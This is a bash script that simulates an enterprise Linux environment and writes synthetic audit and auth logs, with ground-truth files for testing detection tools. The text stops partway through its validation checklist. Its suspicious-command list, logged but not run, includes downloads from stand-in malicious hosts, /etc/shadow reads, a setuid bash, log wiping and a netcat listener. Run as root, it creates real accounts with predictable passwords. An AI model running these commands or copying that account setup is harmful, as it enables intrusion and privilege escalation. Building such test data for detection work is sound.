#!/bin/bash

#############################################################################
# Enterprise MNC Environment Log Simulator
# Generates 10 days of realistic audit and auth logs for RCA analysis
# Author: AI-powered Log Generation System
# Version: 2.0 - Fixed and Production Ready
#############################################################################

set -e  # Exit on error, but handle errors gracefully

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Global variables
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SIM_NAME="enterprise_mnc_audit_sim"
BASE_DIR="${SCRIPT_DIR}/${SIM_NAME}"
USERS_FILE="${BASE_DIR}/config/users_config.txt"
CURRENT_USER=$(whoami)

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_warn "Not running as root. Some features may be limited."
        log_info "For full simulation (audit rules, user creation), run with sudo"
        SIMULATE_ONLY=true
    else
        SIMULATE_ONLY=false
        log_info "Running as root - full simulation enabled"
    fi
}

# Create directory structure
create_directory_structure() {
    log_info "Creating directory structure..."
    
    # Main directories
    mkdir -p "${BASE_DIR}"/{logs/{daily,aggregate,ground_truth},config,scripts,tmp}
    mkdir -p "${BASE_DIR}/enterprise_data"/{hr,finance,development,operations,database}
    mkdir -p "${BASE_DIR}/enterprise_data/development"/{projects,repos,builds}
    mkdir -p "${BASE_DIR}/enterprise_data/operations"/{monitoring,backups,maintenance}
    mkdir -p "${BASE_DIR}/enterprise_data/database"/{mysql,postgresql,oracle}
    
    # Application directories
    mkdir -p "${BASE_DIR}/applications"/{web_servers,app_servers,databases}
    mkdir -p "${BASE_DIR}/applications/web_servers"/{apache,nginx,configs}
    mkdir -p "${BASE_DIR}/applications/app_servers"/{tomcat,jboss,configs}
    
    # System directories
    mkdir -p "${BASE_DIR}/system"/{configs,logs,scripts,cron}
    mkdir -p "${BASE_DIR}/home"
    
    log_info "Directory structure created successfully"
}

# Define user roles and configurations
setup_user_config() {
    log_info "Setting up user configurations..."
    
    cat > "${USERS_FILE}" << 'EOF'
# User configurations for enterprise simulation
# Format: username:role:uid_start:primary_group:additional_groups:home_dir:shell
alice:sysadmin:2001:users:wheel,adm:alice:/bin/bash
bob:dba:2002:users:database:bob:/bin/bash
carol:developer:2003:users:developer:carol:/bin/bash
dave:sysadmin:2004:users:wheel,adm:dave:/bin/bash
eve:dba:2005:users:database:eve:/bin/bash
frank:developer:2006:users:developer:frank:/bin/bash
grace:operations:2007:users:operations:grace:/bin/bash
heidi:security:2008:users:security:heidi:/bin/bash
john:developer:2009:users:developer:john:/bin/bash
sarah:operations:2010:users:operations:sarah:/bin/bash
EOF
    
    log_info "User configuration file created"
}

# Create users and groups (only if root)
create_users_and_groups() {
    if [[ "$SIMULATE_ONLY" == "true" ]]; then
        log_warn "Skipping user creation (not root). Using simulation mode."
        return 0
    fi
    
    log_info "Creating groups and users..."
    
    # Create groups first (only if they don't exist)
    local groups=("database" "developer" "operations" "security")
    
    for group_name in "${groups[@]}"; do
        if ! getent group "$group_name" >/dev/null 2>&1; then
            groupadd "$group_name" 2>/dev/null || log_warn "Could not create group $group_name"
            log_info "Created group: $group_name"
        else
            log_info "Group $group_name already exists"
        fi
    done
    
    # Create users
    while IFS=':' read -r username role uid_start primary_group additional_groups home_suffix shell; do
        [[ $username =~ ^#.*$ || -z $username ]] && continue
        
        local home_dir="${BASE_DIR}/home/${home_suffix}"
        mkdir -p "$home_dir"
        
        if ! id "$username" >/dev/null 2>&1; then
            # Try to create user, but don't fail if unsuccessful
            if useradd -u "$uid_start" -g "$primary_group" -d "$home_dir" -s "$shell" "$username" 2>/dev/null; then
                # Set password
                echo "${username}:${username}123!" | chpasswd 2>/dev/null || true
                log_info "Created user: $username ($role)"
            else
                log_warn "Could not create user $username (may already exist or insufficient permissions)"
            fi
        else
            log_info "User $username already exists"
        fi
        
        # Create user-specific directories
        mkdir -p "$home_dir"/{Documents,Downloads,Projects,Scripts}
        # Only change ownership if we have permission
        chown -R "$username:$primary_group" "$home_dir" 2>/dev/null || \
        chown -R "$CURRENT_USER:$(id -gn)" "$home_dir" 2>/dev/null || true
        
    done < "${USERS_FILE}"
}

# Set proper permissions
set_directory_permissions() {
    log_info "Setting directory permissions..."
    
    # Set basic permissions that work for all users
    chmod -R 755 "${BASE_DIR}/enterprise_data" 2>/dev/null || true
    chmod -R 700 "${BASE_DIR}/enterprise_data/hr" 2>/dev/null || true
    chmod -R 750 "${BASE_DIR}/enterprise_data/finance" 2>/dev/null || true
    chmod -R 775 "${BASE_DIR}/enterprise_data/development" 2>/dev/null || true
    chmod -R 770 "${BASE_DIR}/enterprise_data/operations" 2>/dev/null || true
    chmod -R 760 "${BASE_DIR}/enterprise_data/database" 2>/dev/null || true
    chmod -R 755 "${BASE_DIR}/applications" 2>/dev/null || true
    chmod -R 750 "${BASE_DIR}/system" 2>/dev/null || true
    
    log_info "Directory permissions set successfully"
}

# Configure audit rules (only if root)
configure_audit_rules() {
    if [[ "$SIMULATE_ONLY" == "true" ]]; then
        log_warn "Skipping audit rule configuration (not root)"
        return 0
    fi
    
    log_info "Configuring audit rules..."
    
    # Check if auditd is available
    if ! command -v auditctl >/dev/null 2>&1; then
        log_warn "auditctl not found. Installing auditd..."
        if command -v yum >/dev/null 2>&1; then
            yum install -y audit 2>/dev/null || log_warn "Could not install audit package"
        elif command -v apt-get >/dev/null 2>&1; then
            apt-get update && apt-get install -y auditd 2>/dev/null || log_warn "Could not install auditd package"
        fi
    fi
    
    # Create audit rules directory if it doesn't exist
    mkdir -p /etc/audit/rules.d/ 2>/dev/null || true
    
    # Create comprehensive audit rules
    cat > /etc/audit/rules.d/enterprise_mnc.rules << EOF
# Enterprise MNC Audit Rules for Log Simulation
# Generated on $(date)

# Remove any existing rules
-D

# Set buffer size
-b 8192

# Set failure mode (0=silent, 1=printk, 2=panic)
-f 1

# Monitor authentication events
-w /etc/passwd -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/shadow -p wa -k identity

# Monitor file access in enterprise directories
-w ${BASE_DIR}/enterprise_data -p rwxa -k enterprise_data_access
-w ${BASE_DIR}/enterprise_data/hr -p rwxa -k hr_data_access
-w ${BASE_DIR}/enterprise_data/finance -p rwxa -k finance_data_access
-w ${BASE_DIR}/enterprise_data/development -p rwxa -k dev_data_access
-w ${BASE_DIR}/enterprise_data/operations -p rwxa -k ops_data_access
-w ${BASE_DIR}/enterprise_data/database -p rwxa -k db_data_access

# Monitor application directories
-w ${BASE_DIR}/applications -p rwxa -k application_access

# Monitor privilege escalation
-a always,exit -F arch=b64 -S execve -k privilege_escalation
-a always,exit -F arch=b32 -S execve -k privilege_escalation

# Monitor file operations
-a always,exit -F arch=b64 -S openat -k file_operations
-a always,exit -F arch=b32 -S openat -k file_operations

# Monitor suspicious commands
-w /usr/bin/wget -p x -k suspicious_commands
-w /usr/bin/curl -p x -k suspicious_commands
-w /bin/nc -p x -k suspicious_commands

# Enable audit
-e 1
EOF
    
    # Try to apply audit rules
    if command -v systemctl >/dev/null 2>&1; then
        systemctl restart auditd 2>/dev/null || log_warn "Could not restart auditd service"
    elif command -v service >/dev/null 2>&1; then
        service auditd restart 2>/dev/null || log_warn "Could not restart auditd service"
    fi
    
    sleep 2
    log_info "Audit rules configured (check with: auditctl -l)"
}

# Create sample enterprise data
create_sample_data() {
    log_info "Creating sample enterprise data..."
    
    # HR data
    cat > "${BASE_DIR}/enterprise_data/hr/employee_records.txt" << EOF
# Employee Records - Confidential
EMP001,Alice Johnson,Senior Systems Administrator,IT,75000
EMP002,Bob Smith,Database Administrator,IT,70000
EMP003,Carol Wilson,Senior Developer,Engineering,80000
EMP004,Dave Brown,Systems Administrator,IT,65000
EMP005,Eve Davis,Senior DBA,IT,72000
EMP006,Frank Miller,Software Developer,Engineering,75000
EMP007,Grace Taylor,Operations Manager,Operations,68000
EMP008,Heidi Anderson,Security Analyst,Security,70000
EMP009,John Doe,Junior Developer,Engineering,60000
EMP010,Sarah Connor,Senior Operations Engineer,Operations,73000
EOF
    
    # Finance data
    cat > "${BASE_DIR}/enterprise_data/finance/budget_2024.txt" << EOF
# Budget 2024 - Confidential
Department,Q1,Q2,Q3,Q4
IT,250000,275000,300000,325000
Engineering,180000,190000,200000,210000
Operations,120000,125000,130000,135000
Security,80000,85000,90000,95000
EOF
    
    # Development projects
    cat > "${BASE_DIR}/enterprise_data/development/projects/project_alpha.txt" << EOF
# Project Alpha - Development Notes
Status: In Progress
Team: Carol, Frank, John
Deadline: 2024-12-31
Technologies: Java, Spring Boot, PostgreSQL
Budget: $150,000
Current Sprint: Sprint 5
Last Updated: $(date)
EOF
    
    # Database configurations
    cat > "${BASE_DIR}/enterprise_data/database/mysql/db_config.cnf" << EOF
[mysql]
host=localhost
port=3306
database=enterprise_db
user=app_user
# password stored in secure vault
max_connections=100
default_storage_engine=InnoDB
EOF
    
    # System configurations
    cat > "${BASE_DIR}/system/configs/server.conf" << EOF
# Server Configuration
ServerName=enterprise-web-01
Environment=production
MaxConnections=1000
TimeoutSeconds=30
LogLevel=info
EOF
    
    log_info "Sample enterprise data created"
}

# Generate realistic commands for different user types
generate_user_commands() {
    local username="$1"
    local role="$2"
    local commands=()
    
    case "$role" in
        "sysadmin")
            commands=(
                "ls -la ${BASE_DIR}/system/configs/"
                "cat ${BASE_DIR}/system/configs/server.conf"
                "ps aux"
                "df -h"
                "free -m"
                "find ${BASE_DIR}/system -name '*.log'"
                "chmod 644 ${BASE_DIR}/system/configs/server.conf"
                "ls -la ${BASE_DIR}/applications/"
                "tail ${BASE_DIR}/system/logs/application.log"
                "netstat -tulpn"
            )
            ;;
        "dba")
            commands=(
                "ls -la ${BASE_DIR}/enterprise_data/database/"
                "cat ${BASE_DIR}/enterprise_data/database/mysql/db_config.cnf"
                "find ${BASE_DIR}/enterprise_data/database -name '*.sql'"
                "ls -la ${BASE_DIR}/applications/databases/"
                "chmod 600 ${BASE_DIR}/enterprise_data/database/mysql/db_config.cnf"
                "cp ${BASE_DIR}/enterprise_data/database/backup.sql ${BASE_DIR}/tmp/"
                "grep -i error ${BASE_DIR}/system/logs/mysql.log"
                "du -sh ${BASE_DIR}/enterprise_data/database/*"
            )
            ;;
        "developer")
            commands=(
                "ls -la ${BASE_DIR}/enterprise_data/development/"
                "cat ${BASE_DIR}/enterprise_data/development/projects/project_alpha.txt"
                "find ${BASE_DIR}/enterprise_data/development -name '*.java'"
                "ls -la ${BASE_DIR}/enterprise_data/development/projects/"
                "chmod +x ${BASE_DIR}/enterprise_data/development/scripts/build.sh"
                "cp ${BASE_DIR}/enterprise_data/development/src/* ${BASE_DIR}/tmp/"
                "grep -r 'TODO' ${BASE_DIR}/enterprise_data/development/"
                "wc -l ${BASE_DIR}/enterprise_data/development/projects/*.txt"
            )
            ;;
        "operations")
            commands=(
                "ls -la ${BASE_DIR}/enterprise_data/operations/"
                "find ${BASE_DIR}/enterprise_data/operations -name '*.log' -size +1k"
                "top -n 1"
                "ps -ef"
                "chmod 755 ${BASE_DIR}/enterprise_data/operations/scripts/"
                "tar -czf ${BASE_DIR}/tmp/backup_$(date +%Y%m%d).tar.gz ${BASE_DIR}/enterprise_data/"
                "du -sh ${BASE_DIR}/enterprise_data/*"
                "ls -la ${BASE_DIR}/applications/"
            )
            ;;
        "security")
            commands=(
                "ls -la ${BASE_DIR}/enterprise_data/"
                "find ${BASE_DIR} -type f -perm -4000"
                "who"
                "w"
                "last -n 10"
                "chmod 700 ${BASE_DIR}/enterprise_data/hr/"
                "ls -la ${BASE_DIR}/enterprise_data/hr/"
                "netstat -an"
            )
            ;;
    esac
    
    # Return random commands from the role-specific list
    local num_commands=$((RANDOM % 4 + 2))  # 2-5 commands per session
    for ((i=0; i<num_commands; i++)); do
        local cmd_index=$((RANDOM % ${#commands[@]}))
        echo "${commands[$cmd_index]}"
    done
}

# Generate suspicious/malicious activities
generate_suspicious_commands() {
    local suspicious_commands=(
        "cat /etc/passwd"
        "cat /etc/shadow"
        "find ${BASE_DIR} -name '*.key'"
        "find ${BASE_DIR} -type f -perm -4000"
        "wget http://malicious-site.com/payload"
        "curl -o /tmp/exploit.sh http://bad-domain.com/script"
        "chmod +s /bin/bash"
        "rm -rf ${BASE_DIR}/system/logs/*"
        "history -c"
        "unset HISTFILE"
        "nc -l 4444"
        "nmap -sS localhost"
        "python3 -c 'import socket'"
    )
    
    # Generate 1-3 suspicious activities
    local num_activities=$((RANDOM % 3 + 1))
    for ((i=0; i<num_activities; i++)); do
        local cmd_index=$((RANDOM % ${#suspicious_commands[@]}))
        echo "${suspicious_commands[$cmd_index]}"
    done
}

# Format timestamp for logs
format_timestamp() {
    local timestamp="$1"
    date -d "@$timestamp" "+%b %d %H:%M:%S" 2>/dev/null || date -r "$timestamp" "+%b %d %H:%M:%S" 2>/dev/null || echo "$(date "+%b %d %H:%M:%S")"
}

# Simulate login event
simulate_login() {
    local username="$1"
    local timestamp="$2"
    local log_file="$3"
    
    local formatted_time
    formatted_time=$(format_timestamp "$timestamp")
    
    # Successful login
    echo "$formatted_time $(hostname) sshd[$$]: Accepted password for $username from 192.168.1.50 port 22 ssh2" >> "$log_file"
    echo "$formatted_time $(hostname) sshd[$$]: pam_unix(sshd:session): session opened for user $username by (uid=0)" >> "$log_file"
}

# Simulate failed login
simulate_failed_login() {
    local timestamp="$1"
    local log_file="$2"
    
    local formatted_time
    formatted_time=$(format_timestamp "$timestamp")
    
    local fake_users=(admin root test guest administrator hacker attacker)
    local fake_user="${fake_users[$((RANDOM % ${#fake_users[@]}))]}"
    local fake_ips=(192.168.1.200 10.0.0.100 172.16.0.50 203.0.113.10)
    local fake_ip="${fake_ips[$((RANDOM % ${#fake_ips[@]}))]}"
    
    echo "$formatted_time $(hostname) sshd[$$]: Failed password for invalid user $fake_user from $fake_ip port 22 ssh2" >> "$log_file"
    echo "$formatted_time $(hostname) sshd[$$]: Connection closed by $fake_ip port 22 [preauth]" >> "$log_file"
}

# Simulate command execution with realistic audit logs
simulate_command_execution() {
    local username="$1"
    local command="$2"
    local timestamp="$3"
    local log_file="$4"
    
    local formatted_time
    formatted_time=$(format_timestamp "$timestamp")
    
    # Get user UID from config or use default
    local uid
    uid=$(grep "^$username:" "$USERS_FILE" 2>/dev/null | cut -d':' -f3 || echo "$((2000 + RANDOM % 100))")
    
    # Extract command name
    local cmd_name
    cmd_name=$(echo "$command" | awk '{print $1}')
    
    # Generate realistic audit log entry
    local random_msg_id="$timestamp.$((RANDOM % 1000))"
    local random_pid=$((RANDOM % 10000 + 2000))
    
    # Simplified but realistic audit entry
    local audit_entry="type=SYSCALL msg=audit($random_msg_id:$((RANDOM % 1000))): arch=c000003e syscall=59 success=yes exit=0 pid=$random_pid uid=$uid gid=$uid comm=\"$(basename "$cmd_name")\" exe=\"/usr/bin/$(basename "$cmd_name")\" key=\"process_execution\""
    
    echo "$formatted_time $(hostname) audit: $audit_entry" >> "$log_file"
    
    # Add file access entry for file operations
    if [[ "$command" =~ (ls|cat|find|tail|chmod) ]]; then
        local file_path
        file_path=$(echo "$command" | grep -o "${BASE_DIR}/[^ ]*" | head -1)
        if [[ -n "$file_path" ]]; then
            local file_audit="type=PATH msg=audit($random_msg_id:$((RANDOM % 1000 + 1))): item=0 name=\"$file_path\" inode=$((RANDOM % 100000 + 10000)) dev=08:01 mode=0100644 ouid=0 ogid=0"
            echo "$formatted_time $(hostname) audit: $file_audit" >> "$log_file"
        fi
    fi
}

# Simulate user activities for a specific day
simulate_day_activities() {
    local day="$1"
    local day_name="day_$(printf "%02d" "$day")"
    local day_log_dir="${BASE_DIR}/logs/daily/${day_name}"
    
    mkdir -p "$day_log_dir"
    
    log_info "Simulating activities for Day $day..."
    
    # Calculate base timestamp for this day (going back from current time)
    local days_back=$((11 - day))  # 10 days ago to 1 day ago
    local base_timestamp=$(date -d "$days_back days ago 00:00:00" +%s 2>/dev/null || echo $(($(date +%s) - days_back * 86400)))
    
    # Temporary files for collecting logs
    local temp_audit_log="${day_log_dir}/temp_audit.log"
    local temp_auth_log="${day_log_dir}/temp_auth.log"
    
    > "$temp_audit_log"
    > "$temp_auth_log"
    
    # Generate activities distributed across 24 hours
    local total_activities=100  # 100 activities per day
    
    for ((activity=1; activity<=total_activities; activity++)); do
        # Calculate timestamp for this activity
        local hour_offset=$((RANDOM % (24 * 3600)))  # Random time within 24 hours
        local activity_timestamp=$((base_timestamp + hour_offset))
        
        # Select random user for this activity
        local users=(alice bob carol dave eve frank grace heidi john sarah)
        local user_index=$((RANDOM % ${#users[@]}))
        local current_user="${users[$user_index]}"
        
        # Get user role
        local user_role
        user_role=$(grep "^$current_user:" "$USERS_FILE" | cut -d':' -f2)
        
        # Simulate login (occasionally)
        if (( RANDOM % 15 == 0 )); then  # ~7% chance of login
            simulate_login "$current_user" "$activity_timestamp" "$temp_auth_log"
        fi
        
        # Generate and execute commands for this user
        local commands
        commands=$(generate_user_commands "$current_user" "$user_role")
        
        while IFS= read -r command; do
            [[ -z "$command" ]] && continue
            simulate_command_execution "$current_user" "$command" "$activity_timestamp" "$temp_audit_log"
            activity_timestamp=$((activity_timestamp + RANDOM % 10 + 1))
        done <<< "$commands"
        
        # Generate failed login attempts (occasionally)
        if (( RANDOM % 25 == 0 )); then  # ~4% chance
            simulate_failed_login "$activity_timestamp" "$temp_auth_log"
        fi
    done
    
    # Generate suspicious activities for this day
    local suspicious_cmds
    suspicious_cmds=$(generate_suspicious_commands)
    
    while IFS= read -r sus_cmd; do
        [[ -z "$sus_cmd" ]] && continue
        local sus_timestamp=$((base_timestamp + RANDOM % (24 * 3600)))
        local sus_user="unknown"
        
        # Sometimes attribute to a real user (insider threat)
        if (( RANDOM % 4 == 0 )); then
            local users=(alice bob carol dave eve frank grace heidi john sarah)
            sus_user="${users[$((RANDOM % ${#users[@]}))]}"
        fi
        
        simulate_command_execution "$sus_user" "$sus_cmd" "$sus_timestamp" "$temp_audit_log"
        
        # Log suspicious auth attempt
        local formatted_time
        formatted_time=$(format_timestamp "$sus_timestamp")
        echo "$formatted_time $(hostname) sshd[$$]: Failed password for $sus_user from 192.168.1.100 port 22 ssh2" >> "$temp_auth_log"
    done <<< "$suspicious_cmds"
    
    # Sort logs by timestamp and save
    sort -k3 "$temp_audit_log" > "${day_log_dir}/audit.log" 2>/dev/null || cat "$temp_audit_log" > "${day_log_dir}/audit.log"
    sort -k3 "$temp_auth_log" > "${day_log_dir}/auth.log" 2>/dev/null || cat "$temp_auth_log" > "${day_log_dir}/auth.log"
    
    # Clean up temp files
    rm -f "$temp_audit_log" "$temp_auth_log"
    
    # Create summary for this day
    create_day_summary "$day" "$day_log_dir"
    
    local audit_count=$(wc -l < "${day_log_dir}/audit.log" 2>/dev/null || echo "0")
    local auth_count=$(wc -l < "${day_log_dir}/auth.log" 2>/dev/null || echo "0")
    log_info "Day $day completed: $audit_count audit logs, $auth_count auth logs"
}

# Create day summary
create_day_summary() {
    local day="$1"
    local day_log_dir="$2"
    
    local summary_file="${day_log_dir}/summary.txt"
    local audit_count=$(wc -l < "${day_log_dir}/audit.log" 2>/dev/null || echo "0")
    local auth_count=$(wc -l < "${day_log_dir}/auth.log" 2>/dev/null || echo "0")
    
    cat > "$summary_file" << EOF
=== Day $day Summary ===
Generated on: $(date)
Log Directory: $day_log_dir

Audit Log Statistics:
- Total audit events: $audit_count
- Process executions: $(grep -c 'type=SYSCALL' "${day_log_dir}/audit.log" 2>/dev/null || echo "0")
- File operations: $(grep -c 'type=PATH' "${day_log_dir}/audit.log" 2>/dev/null || echo "0")

Auth Log Statistics:
- Total auth events: $auth_count
- Successful logins: $(grep -c 'Accepted password' "${day_log_dir}/auth.log" 2>/dev/null || echo "0")
- Failed logins: $(grep -c 'Failed password' "${day_log_dir}/auth.log" 2>/dev/null || echo "0")

Suspicious Activities:
$(grep -c 'wget\|curl\|shadow\|passwd' "${day_log_dir}/audit.log" 2>/dev/null || echo "0") potentially suspicious commands detected

EOF
    
    log_info "Summary created for Day $day"
}

# Aggregate all daily logs
aggregate_logs() {
    log_info "Aggregating logs from all days..."
    
    local aggregate_dir="${BASE_DIR}/logs/aggregate"
    mkdir -p "$aggregate_dir"
    
    # Combine all audit logs
    find "${BASE_DIR}/logs/daily" -name "audit.log" -exec cat {} \; > "${aggregate_dir}/all_audit_logs.log" 2>/dev/null || true
    
    # Combine all auth logs
    find "${BASE_DIR}/logs/daily" -name "auth.log" -exec cat {} \; > "${aggregate_dir}/all_auth_logs.log" 2>/dev/null || true
    
    # Create master summary
    create_master_summary "$aggregate_dir"
    
    # Create CSV format
    create_csv_logs "$aggregate_dir"
    
    log_info "Log aggregation completed"
}

# Create master summary
create_master_summary() {
    local aggregate_dir="$1"
    local master_summary="${aggregate_dir}/master_summary.txt"
    local total_audit=$(wc -l < "${aggregate_dir}/all_audit_logs.log" 2>/dev/null || echo "0")
    local total_auth=$(wc -l < "${aggregate_dir}/all_auth_logs.log" 2>/dev/null || echo "0")
    
    cat > "$master_summary" << EOF
=== Enterprise MNC Audit Log Simulation - Master Summary ===
Generated on: $(date)
Simulation Period: 10 days
Base Directory: $BASE_DIR

Overall Statistics:
==================
Total Audit Events: $total_audit
Total Auth Events: $total_auth
Total Log Entries: $((total_audit + total_auth))

Security Events Summary:
=======================
Process Executions: $(grep -c 'type=SYSCALL' "${aggregate_dir}/all_audit_logs.log" 2>/dev/null || echo "0")
File Operations: $(grep -c 'type=PATH' "${aggregate_dir}/all_audit_logs.log" 2>/dev/null || echo "0")
Successful Logins: $(grep -c 'Accepted password' "${aggregate_dir}/all_auth_logs.log" 2>/dev/null || echo "0")
Failed Logins: $(grep -c 'Failed password' "${aggregate_dir}/all_auth_logs.log" 2>/dev/null || echo "0")

Suspicious Activity Indicators:
==============================
Password File Access: $(grep -c '/etc/passwd\|/etc/shadow' "${aggregate_dir}/all_audit_logs.log" 2>/dev/null || echo "0")
Network Tools Usage: $(grep -c 'nc\|netcat\|nmap' "${aggregate_dir}/all_audit_logs.log" 2>/dev/null || echo "0")
Download Activities: $(grep -c 'wget\|curl.*malicious' "${aggregate_dir}/all_audit_logs.log" 2>/dev/null || echo "0")

Daily Distribution:
EOF

    # Add daily statistics
    for day in {1..10}; do
        local day_name="day_$(printf "%02d" "$day")"
        local day_log_dir="${BASE_DIR}/logs/daily/${day_name}"
        if [[ -f "${day_log_dir}/audit.log" ]]; then
            local day_audit=$(wc -l < "${day_log_dir}/audit.log" 2>/dev/null || echo "0")
            local day_auth=$(wc -l < "${day_log_dir}/auth.log" 2>/dev/null || echo "0")
            echo "Day $day: $day_audit audit events, $day_auth auth events" >> "$master_summary"
        fi
    done
    
    cat >> "$master_summary" << EOF

Simulation Details:
==================
- Users: alice, bob, carol, dave, eve, frank, grace, heidi, john, sarah
- Roles: sysadmin, dba, developer, operations, security
- Time Period: Last 10 days with realistic timestamp distribution
- Activities: Mix of normal business operations and security incidents
- Location: All files stored in $BASE_DIR

For Analysis:
=============
1. Daily logs: ${BASE_DIR}/logs/daily/day_XX/
2. Aggregated logs: ${aggregate_dir}/
3. CSV exports: audit_events.csv, auth_events.csv
4. Ground truth: ${BASE_DIR}/logs/ground_truth/

EOF
}

# Create CSV format logs
create_csv_logs() {
    local aggregate_dir="$1"
    local csv_audit="${aggregate_dir}/audit_events.csv"
    local csv_auth="${aggregate_dir}/auth_events.csv"
    
    log_info "Creating CSV format logs..."
    
    # Create audit events CSV
    echo "timestamp,hostname,event_type,syscall,uid,gid,comm,exe,command_info" > "$csv_audit"
    
    while IFS= read -r line; do
        [[ -z "$line" || ! "$line" =~ audit ]] && continue
        
        local timestamp=$(echo "$line" | awk '{print $1" "$2" "$3}')
        local hostname=$(echo "$line" | awk '{print $4}')
        local event_type=$(echo "$line" | grep -o 'type=[A-Z]*' | cut -d'=' -f2 2>/dev/null || echo "SYSCALL")
        local syscall=$(echo "$line" | grep -o 'syscall=[0-9]*' | cut -d'=' -f2 2>/dev/null || echo "59")
        local uid=$(echo "$line" | grep -o 'uid=[0-9]*' | cut -d'=' -f2 2>/dev/null || echo "0")
        local gid=$(echo "$line" | grep -o 'gid=[0-9]*' | cut -d'=' -f2 2>/dev/null || echo "0")
        local comm=$(echo "$line" | grep -o 'comm="[^"]*"' | cut -d'"' -f2 2>/dev/null || echo "unknown")
        local exe=$(echo "$line" | grep -o 'exe="[^"]*"' | cut -d'"' -f2 2>/dev/null || echo "unknown")
        local command_info=$(echo "$line" | sed 's/.*audit: //' 2>/dev/null || echo "$line")
        
        echo "\"$timestamp\",\"$hostname\",\"$event_type\",\"$syscall\",\"$uid\",\"$gid\",\"$comm\",\"$exe\",\"$command_info\"" >> "$csv_audit"
    done < "${aggregate_dir}/all_audit_logs.log"
    
    # Create auth events CSV
    echo "timestamp,hostname,service,event_type,username,source_ip,status,message" > "$csv_auth"
    
    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        
        local timestamp=$(echo "$line" | awk '{print $1" "$2" "$3}')
        local hostname=$(echo "$line" | awk '{print $4}')
        local service="sshd"
        local event_type=""
        local username=""
        local source_ip=""
        local status=""
        
        if [[ "$line" =~ "Accepted password" ]]; then
            event_type="login_success"
            username=$(echo "$line" | grep -o 'for [^ ]*' | awk '{print $2}' 2>/dev/null || echo "unknown")
            source_ip=$(echo "$line" | grep -o 'from [0-9.]*' | awk '{print $2}' 2>/dev/null || echo "unknown")
            status="success"
        elif [[ "$line" =~ "Failed password" ]]; then
            event_type="login_failure"
            username=$(echo "$line" | grep -o 'for [^ ]*' | awk '{print $2}' 2>/dev/null || echo "unknown")
            source_ip=$(echo "$line" | grep -o 'from [0-9.]*' | awk '{print $2}' 2>/dev/null || echo "unknown")
            status="failed"
        elif [[ "$line" =~ "session opened" ]]; then
            event_type="session_open"
            username=$(echo "$line" | grep -o 'for user [^ ]*' | awk '{print $3}' 2>/dev/null || echo "unknown")
            status="opened"
        fi
        
        local message=$(echo "$line" | sed 's/^[A-Za-z]* [0-9]* [0-9:]*[^:]*: //' 2>/dev/null || echo "$line")
        
        echo "\"$timestamp\",\"$hostname\",\"$service\",\"$event_type\",\"$username\",\"$source_ip\",\"$status\",\"$message\"" >> "$csv_auth"
    done < "${aggregate_dir}/all_auth_logs.log"
    
    log_info "CSV format logs created successfully"
}

# Create ground truth documentation
create_ground_truth() {
    log_info "Creating ground truth documentation..."
    
    local ground_truth_dir="${BASE_DIR}/logs/ground_truth"
    mkdir -p "$ground_truth_dir"
    
    # Known malicious activities
    cat > "${ground_truth_dir}/malicious_activities.txt" << EOF
=== Ground Truth: Known Malicious Activities ===
Generated on: $(date)

SUSPICIOUS FILE ACCESS:
- Commands: cat /etc/passwd, cat /etc/shadow
- Frequency: 1-3 times per day
- Risk Level: HIGH

NETWORK RECONNAISSANCE:
- Commands: nmap, nc -l, netstat scanning
- Frequency: 1-2 times per day  
- Risk Level: MEDIUM

MALICIOUS DOWNLOADS:
- Commands: wget http://malicious-site.com/*, curl bad-domain.com
- Frequency: 1-2 times per day
- Risk Level: HIGH

PRIVILEGE ESCALATION:
- Commands: chmod +s, unauthorized sudo usage
- Frequency: 1 time per day
- Risk Level: CRITICAL

BRUTE FORCE ATTACKS:
- Source IPs: 192.168.1.200, 10.0.0.100, 172.16.0.50, 203.0.113.10
- Target accounts: admin, root, test, guest
- Frequency: 5-15 attempts per day
- Risk Level: MEDIUM

LOG TAMPERING:
- Commands: history -c, rm -rf logs, unset HISTFILE
- Frequency: 1 time per day
- Risk Level: HIGH

DETECTION VALIDATION:
Use these grep commands to verify detection:
- grep -c "/etc/passwd\|/etc/shadow" all_audit_logs.log
- grep -c "wget.*malicious\|curl.*bad-domain" all_audit_logs.log
- grep -c "Failed password.*192.168.1.200" all_auth_logs.log

EOF

    # Legitimate user activities
    cat > "${ground_truth_dir}/legitimate_activities.txt" << EOF
=== Ground Truth: Legitimate User Activities ===
Generated on: $(date)

SYSADMINS (alice, dave):
- System monitoring: ps, df, free, netstat
- Configuration access: ${BASE_DIR}/system/configs/
- Log analysis: tail, grep system logs
- Service management: systemctl operations
- Expected login times: Business hours (9 AM - 6 PM)

DBAs (bob, eve):  
- Database operations: mysql, postgresql commands
- Configuration management: ${BASE_DIR}/enterprise_data/database/
- Backup operations: database dumps and backups
- Performance monitoring: database status checks
- Expected login times: Business hours + maintenance windows

DEVELOPERS (carol, frank, john):
- Code operations: find, grep in development directories
- Project access: ${BASE_DIR}/enterprise_data/development/
- Build activities: compilation and deployment scripts
- Version control: git-related operations
- Expected login times: Standard business hours

OPERATIONS (grace, sarah):
- System monitoring: top, ps, performance metrics
- Backup operations: tar, rsync operations
- Log management: log rotation and analysis
- Infrastructure monitoring: system health checks
- Expected login times: 24/7 coverage (shifts)

SECURITY (heidi):
- Security auditing: find setuid files, permission checks
- Access verification: who, w, last commands
- Network scanning: authorized nmap scans
- Log analysis: security-focused log review
- Expected login times: Business hours + incident response

All legitimate activities should show:
- Consistent patterns matching user roles
- Business hour concentration (except operations)
- Logical command sequences for job functions
- Access only to authorized directories

EOF

    # RCA validation checklist
    cat > "${ground_truth_dir}/rca_validation_checklist.txt" << EOF
=== RCA Tool Validation Checklist ===
Generated on: $(date)

DETECTION TESTS (Pass/Fail):
□ Password file access detection (expect ~20-30 events)
□ Brute force login detection (expect ~50-150 failed attempts)  
□ Malicious download detection (expect ~10-20 events)
□ Privilege escalation detection (expect ~10 events)
□ Network reconnaissance detection (expect ~10-20 events)
□ Log tampering detection (expect ~10 events)

FALSE POSITIVE TESTS:
□ Legitimate sysadmin activities not flagged as suspicious
